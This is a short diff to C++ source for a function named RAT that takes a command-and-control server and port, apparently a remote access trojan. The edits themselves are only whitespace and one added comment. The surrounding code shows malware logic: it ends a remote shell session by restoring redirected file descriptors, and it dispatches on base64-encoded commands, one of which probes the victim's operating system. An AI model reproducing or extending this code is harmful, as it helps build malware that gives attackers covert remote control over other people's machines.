@@ -155,8 +155,7 @@ void RAT(char* C2_Server, int C2_Port)
                     }
 
                     std::cout << "Exiting shell exec..." << std::endl;
-
-
+                    
                     // Recover fd's and close duplicates
                     dup2(dup_orig_stdin,0);
                     dup2(dup_orig_stdout,1);
@@ -177,6 +176,7 @@ void RAT(char* C2_Server, int C2_Port)
                     memset(buffer, 0, sizeof(buffer));
                     memset(CommandReceived, 0, sizeof(CommandReceived));
                 }
+                // Operating System
                 else if ((strcmp(command, "UHJvYmluZyBPcGVyYXRpbmcgU3lzdGVt") == 0))
                 {
                     char buffer[257] = "";
